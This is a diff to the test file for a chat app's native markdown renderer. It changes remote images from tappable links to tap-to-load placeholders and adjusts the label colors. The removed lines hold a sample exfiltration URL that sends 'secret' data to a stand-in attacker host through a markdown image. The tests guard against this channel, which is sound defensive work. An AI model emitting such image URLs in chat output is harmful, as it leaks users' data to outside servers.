@@ -53,9 +53,13 @@ vi.mock("react-native", async () => {
 
   return {
     View: mockComponent("rn-view", ["minWidth", "flex", "flexGrow"]),
-    Text: mockComponent("rn-text", ["accessibilityRole", "textDecorationLine"]),
+    Text: mockComponent("rn-text", ["accessibilityRole", "textDecorationLine", "color"]),
     ScrollView: mockComponent("rn-scroll-view", ["horizontal"]),
-    Pressable: mockComponent("rn-pressable", ["accessibilityRole", "borderBottomWidth"]),
+    Pressable: mockComponent("rn-pressable", [
+      "accessibilityRole",
+      "borderBottomWidth",
+      "backgroundColor",
+    ]),
     TextInput: mockComponent("rn-text-input"),
     Image: mockComponent("rn-image"),
     Animated: {
@@ -87,7 +91,7 @@ import { darkTokens } from "@rakazo/ui-tokens";
 import { act } from "react";
 import { createRoot } from "react-dom/client";
 import { Pressable } from "react-native";
-import { ChatMarkdown, LinkifiedText } from "./markdown.native";
+import { ChatMarkdown, LinkifiedText, RemoteImagesContext } from "./markdown.native";
 
 const THREE_COLUMN_TABLE = `| Name | Status | Detail |
 | --- | --- | --- |
@@ -204,16 +208,15 @@ describe("native markdown lists", () => {
 });
 
 describe("native markdown images", () => {
-  it("shows a remote image as a tappable link instead of loading it", async () => {
-    const html = renderToStaticMarkup(
-      <ChatMarkdown>
-        {'![chart](https://attacker.example.test/p.gif?d=secret "Q3 revenue")'}
-      </ChatMarkdown>,
-    );
+  it("shows a remote image as a placeholder that loads it in place on tap", async () => {
+    const markdown = '![chart](https://images.example.test/tap.png?d=secret "Q3 revenue")';
+    const html = renderToStaticMarkup(<ChatMarkdown>{markdown}</ChatMarkdown>);
     expect(html).not.toContain("<rn-stub");
+    expect(html).toContain('data-accessibility-role="button"');
+    expect(html).toContain('accessibilityLabel="chart, images.example.test"');
     expect(html).toContain('accessibilityHint="Q3 revenue"');
-    expect(html).toContain('data-accessibility-role="link"');
-    expect(html).toContain(">chart</rn-text>");
+    // A filled chip on the muted bubble reads as a control in both themes.
+    expect(html).toContain(`data-background-color="${darkTokens.background}"`);
 
     vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
     linking.openURL.mockClear();
@@ -221,20 +224,32 @@ describe("native markdown images", () => {
     document.body.appendChild(container);
     const root = createRoot(container);
     await act(async () => {
-      root.render(
-        <ChatMarkdown>{"![chart](https://attacker.example.test/p.gif?d=secret)"}</ChatMarkdown>,
-      );
+      root.render(<ChatMarkdown>{markdown}</ChatMarkdown>);
     });
+    expect(container.querySelector("rn-stub")).toBeNull();
     await act(async () => {
-      container.querySelector<HTMLElement>("[data-accessibility-role='link']")?.click();
+      container.querySelector<HTMLElement>("[data-accessibility-role='button']")?.click();
     });
-    await vi.waitFor(() => {
-      expect(linking.openURL).toHaveBeenCalledWith("https://attacker.example.test/p.gif?d=secret");
-    });
+    expect(container.querySelector("rn-stub")).not.toBeNull();
+    expect(container.querySelector("[data-accessibility-role='button']")).toBeNull();
+    expect(linking.openURL).not.toHaveBeenCalled();
     await act(async () => {
       root.unmount();
     });
     container.remove();
+
+    // The reader's choice holds for the session, so a remounted bubble keeps the image.
+    expect(renderToStaticMarkup(<ChatMarkdown>{markdown}</ChatMarkdown>)).toContain("<rn-stub");
+  });
+
+  it("loads remote images at once when the reader turned that on", () => {
+    const html = renderToStaticMarkup(
+      <RemoteImagesContext.Provider value={true}>
+        <ChatMarkdown>{"![chart](https://images.example.test/auto.png)"}</ChatMarkdown>
+      </RemoteImagesContext.Provider>,
+    );
+    expect(html).toContain("<rn-stub");
+    expect(html).not.toContain("data-accessibility-role");
   });
 
   it("shows unopenable image sources and unsafe links as plain text", () => {
@@ -310,8 +325,8 @@ describe("native markdown images", () => {
     expect(html).not.toContain("data-text-decoration-line");
     expect(html).not.toContain("example.test");
     expect(html).not.toContain("javascript:");
-    expect(html).toContain("Open");
-    expect(html).toContain("File");
+    expect(html).toContain(`data-color="${darkTokens.foreground}">Open</rn-text>`);
+    expect(html).toContain(`data-color="${darkTokens.foreground}">File</rn-text>`);
   });
 
   it("shows mailto and tel image sources as plain text", () => {
@@ -335,6 +350,8 @@ describe("native markdown images", () => {
     expect(html).not.toContain("data-text-decoration-line");
     expect(html).not.toContain("badge.example.test");
     expect(html).toContain("build");
+    // The label sits outside any text node, so it must carry the body color itself.
+    expect(html).toContain(`data-color="${darkTokens.foreground}">build</rn-text>`);
   });
 
   it("renders embedded image data inline", () => {
